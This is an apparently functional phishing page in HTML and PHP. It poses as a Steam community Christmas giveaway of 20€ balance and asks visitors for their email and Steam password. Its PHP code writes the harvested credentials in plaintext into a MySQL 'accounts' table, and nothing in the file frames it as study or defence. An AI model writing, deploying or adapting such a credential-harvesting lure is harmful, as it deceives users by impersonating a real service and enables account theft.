<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="./styles/index-style.css">
</head>
<body>

<div>
    <p class="main-content">Free steam balance 20€ for first 5 register.</p>
    <p class="content">We steam community gifting 20€ for Christmas holiday.</p>
</div>

<form action="index.php" method="post">

    <main>
        <div class="email-input">
            <label for="email"></label>
            <input type="email" id="email" name="email" placeholder="gmail" required>
        </div>

        <div class="password-input">
            <label for="password"></label>
            <input type="password" id="password" name="password" placeholder="Steam password" required>
        </div>

        <div class="submit-bottom">
            <input type="submit" id="submit" name="submit" value="Submit">
        </div>
    </main>

</form>

<?php
if (isset($_POST["submit"])) {

    $email = $_POST['email'];
    $password = $_POST['password'];

    // Prijungimas prie DB ir kiti apdorojimo veiksmai
    $servername = "localhost";
    $username = "root";
    $password_db = ""; // DB slaptažodis
    $dbname = "test";

    $conn = new mysqli($servername, $username, $password_db, $dbname);

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $stmt = $conn->prepare("INSERT INTO accounts (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $password);

    if ($stmt->execute()) {
        // Peradresavimas į index.php, kai formos apdorojimas baigtas
        header("Location: index.php");
        exit; // Užtikrina, kad kodas nebus toliau vykdomas
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
}
?>
</body>
</html>